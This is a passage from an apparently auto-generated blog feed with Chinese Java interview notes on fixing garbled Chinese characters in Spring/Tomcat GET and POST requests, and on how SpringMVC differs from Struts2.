<h4 id="如何解决POST请求中文乱码问题，GET的又如何处理呢？"><a href="#如何解决POST请求中文乱码问题，GET的又如何处理呢？" class="headerlink" title="如何解决POST请求中文乱码问题，GET的又如何处理呢？"></a>如何解决POST请求中文乱码问题，GET的又如何处理呢？</h4><ol>
<li>在web.xml中加入：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;filter&gt;</div><div class="line">    &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt;</div><div class="line">    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;</div><div class="line">    &lt;init-param&gt;</div><div class="line">        &lt;param-name&gt;encoding&lt;/param-name&gt;</div><div class="line">        &lt;param-value&gt;utf-8&lt;/param-value&gt;</div><div class="line">    &lt;/init-param&gt;</div><div class="line">&lt;/filter&gt;</div><div class="line">&lt;filter-mapping&gt;</div><div class="line">    &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt;</div><div class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</div><div class="line">&lt;/filter-mapping&gt;</div></pre></td></tr></table></figure>
<p>以上可以解决post请求乱码问题。对于get请求中文参数出现乱码解决方法有两个：</p>
<ol>
<li><p>修改tomcat配置文件添加编码与工程编码一致，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;ConnectorURIEncoding=&quot;utf-8&quot; connectionTimeout=&quot;20000&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; redirectPort=&quot;8443&quot;/&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>另外一种方法对参数进行重新编码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">String userName = new String(request.getParamter(&quot;userName&quot;).getBytes(&quot;ISO8859-1&quot;),&quot;utf-8&quot;)</div></pre></td></tr></table></figure>
</li>
</ol>
<p>注：ISO8859-1是tomcat默认编码，需要将tomcat编码后的内容按utf-8编码</p>
<h4 id="SpringMVC与Struts2的主要区别？"><a href="#SpringMVC与Struts2的主要区别？" class="headerlink" title="SpringMVC与Struts2的主要区别？"></a>SpringMVC与Struts2的主要区别？</h4><ul>
<li>①springmvc的入口是一个servlet即前端控制器，而struts2入口是一个filter过虑器。</li>
<li>②springmvc是基于方法开发，传递参数是通过方法形参，可以设计为单例或多例(建议单例)，struts2是基于类开发，传递参数是通过类的属性，只能设计为多例。 </li>
<li>③Struts采用值栈存储请求和响应的数据，通过OGNL存取数据，springmvc通过参数解析器是将request对象内容进行解析成方法形参，将响应数据和页面封装成ModelAndView对象，最后又将模型数据通过request对象传输到页面。 Jsp视图解析器默认使用jstl。</li>
</ul>
<p><a href="http://www.cnblogs.com/wang-meng/p/5701946.html" target="_blank" rel="external">Java面试大全</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Spring&quot;&gt;&lt;a href=&quot;#Spring&quot; class=&quot;headerlink&quot; title=&quot;Spring&quot;&gt;&lt;/a&gt;Spring&lt;/h3&gt;&lt;h4 id=&quot;什么是Spring框架？Spring框架有哪些主要模块？&quot;&gt;&lt;a href=&quot;#什么是Spring
    
    </summary>
    
      <category term="面试" scheme="http://yoursite.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
      <category term="面试" scheme="http://yoursite.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
</feed>
